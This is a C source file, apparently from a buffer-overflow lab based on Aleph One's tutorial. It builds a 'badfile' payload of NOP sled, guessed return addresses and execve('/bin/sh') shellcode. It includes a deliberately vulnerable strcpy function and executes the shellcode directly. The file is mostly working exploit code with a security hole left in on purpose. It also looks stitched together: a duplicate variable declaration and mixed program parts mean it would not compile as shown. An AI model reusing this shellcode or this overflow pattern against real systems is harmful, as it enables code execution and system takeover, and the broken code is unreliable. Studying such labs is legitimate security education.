/* exploit.c  */

/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;


const char code[] =
    "\x31\xc0" /* Line 1: xorl %eax,%eax */
    "\x50" /* Line 2: pushl %eax */
    "\x68""//sh" /* Line 3: pushl $0x68732f2f */
    "\x68""/bin" /* Line 4: pushl $0x6e69622f */
    "\x89\xe3" /* Line 5: movl %esp,%ebx */
    "\x50" /* Line 6: pushl %eax */
    "\x53" /* Line 7: pushl %ebx */
    "\x89\xe1" /* Line 8: movl %esp,%ecx */
    "\x99" /* Line 9: cdq */
    "\xb0\x0b" /* Line 10: movb $0x0b,%al */
    "\xcd\x80" /* Line 11: int $0x80 */
;


int bof(char *str)
{
    char buffer[24];
    /* The following statement has a buffer overflow problem */

    strcpy(buffer, str);
    return 1;
}

unsigned long get_sp(void)
{
    /* This function (suggested in alephOne's paper) prints the 
       stack pointer using assembly code. */
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */

    /* Initialization of variables (cf. alephOne's tutorial) */
    char *ptr;
    long *addr_ptr, addr;
    int offset = 200, bsize = 517;
    int i;

    addr = get_sp() + offset;

    ptr = buffer;
    addr_ptr = (long*)(ptr);

    /* First, fill with the buffer address 
       This is slightly adapted from alephOne's tutorial
       because gcc detected it as a smashing attempt */
    for (i = 0; i < 10; i++)
      *(addr_ptr++) = addr;

    /* We now fill the rest of the buffer with our shellcode
       which was provided above. Again, this is slightly
       adapted from alephOne's tutorial because gcc  
       detected it as a smashing attempt */
    for (i = 0; i < strlen(shellcode); i++) 
      buffer[bsize - (sizeof(shellcode) + 1) + i] = shellcode[i];

    /* Finally, we insert a NULL code at the very end of the buffer */
    buffer[bsize - 1] = '\0';

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);



    char buf[sizeof(code)];
    strcpy(buf, code);
    ((void(*)( ))buf)( );



    char str[517];
    FILE *badfile;
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}